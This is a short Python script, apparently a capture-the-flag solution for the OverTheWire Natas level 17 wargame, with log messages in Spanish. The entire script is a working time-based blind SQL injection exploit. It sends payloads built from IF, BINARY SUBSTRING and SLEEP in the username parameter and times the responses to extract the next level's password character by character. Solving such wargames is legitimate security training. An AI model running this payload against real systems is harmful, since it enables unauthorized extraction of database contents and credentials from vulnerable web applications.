import requests, time
from pwn import *
from string import ascii_letters, digits

chars = ascii_letters + digits
url = "http://natas17.natas.labs.overthewire.org"
auth = ('natas17', '<ContraseñaNatas17>')
found = ""

p1 = log.progress("Fuerza bruta")
p1.status("Iniciando Ataque")

time.sleep(2)

p2 = log.progress("Password")

for i in range(1, 33): 
    for c in chars:
        payload = f'natas18" AND IF(BINARY SUBSTRING(password,{i},1)="{c}", SLEEP(3), 0) -- '
        start = time.time()
        r = requests.get(url, auth=auth, params={"username": payload})
        elapsed = time.time() - start
        p1.status(payload)
        if elapsed > 2.5: 
            found += c
            p2.status(found)
            break
print("---Contraseña Vulnerada---")
